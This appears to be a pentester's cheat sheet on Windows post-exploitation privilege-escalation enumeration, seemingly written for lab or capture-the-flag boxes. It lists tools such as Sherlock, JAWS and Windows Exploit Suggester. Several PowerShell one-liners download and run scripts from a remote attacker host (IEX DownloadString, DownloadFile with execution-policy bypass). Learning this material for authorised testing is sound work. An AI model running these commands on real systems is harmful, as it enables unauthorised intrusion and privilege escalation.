https://github.com/frizb/Windows-Privilege-Escalation
#
powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.14.124:8111/Sherlock.ps1'); Find-AllVulns

Post Exploit Enum Scripts:
JAWS - Just Another Windows (Enum) Script

Usage:

Run from within CMD shell and write out to file.

powershell -exec bypass -c (new-object System.Net.WebClient).DownloadFile('http://10.10.15.24/jaws.ps1','C:\Windows\temp\jaws.ps1')
CMD C:\Windows\temp> powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt
Run from within CMD shell and write out to screen.

CMD C:\temp> powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1
Run from within PS Shell and write out to file.

PS C:\temp> .\jaws-enum.ps1 -OutputFileName Jaws-Enum.txt
WinPrivCheck by ihack4falafel

Sherlock – New one is Watson
```
PS C:\inetpub\drupal-7.54> IEX(New-Object Net.WebClient).downloadString('http://10.10.14.124:8000/Sherlock.ps1') ; Find-AllVulns
```
PentestMonkey Windows-privesc-check is standalone executable that runs on Windows systems. It tries to find misconfigurations that could allow local unprivileged users to escalate privileges to other users or to access local apps (e.g. databases).

Exploit Suggester For this one, we need to grab the output of systeminfo and then run it against the script. -- Update the database: ./windows-exploit-suggester.py --update
./windows-exploit-suggester.py --database 2018-10-28-mssb.xlsx --systeminfo winsysinfo.txt
OR
-- If we only know about the Operating System name and not much about the hot-fixes, then possible exploits for an operating system can be used without hotfix data
```
./windows-exploit-suggester.py --database 2018-10-28-mssb.xlsx --ostext 'windows server 2008 r2'
```
